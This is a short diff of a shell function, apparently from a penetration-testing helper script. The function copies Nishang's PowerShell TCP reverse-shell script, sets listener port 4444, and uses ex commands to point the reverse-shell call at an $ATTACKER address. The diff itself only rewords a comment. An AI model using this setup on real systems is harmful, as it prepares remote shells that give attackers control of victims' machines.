@@ -151,7 +151,7 @@ function nishanghere {
     export PORT=4444
   fi
   cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 nishang.ps1
-  # take the line, paste at end and remove "PS >"
+  # take the line, move to end and remove "PS >"
   ex -s -c 'g/Invoke.*Tcp -Rev.*192.168.254.226/m$' -c '$s/PS > //' -c wq nishang.ps1
   # edit the IP
   ex -s -c "\$s/192.168.254.226/$ATTACKER/" -c wq nishang.ps1
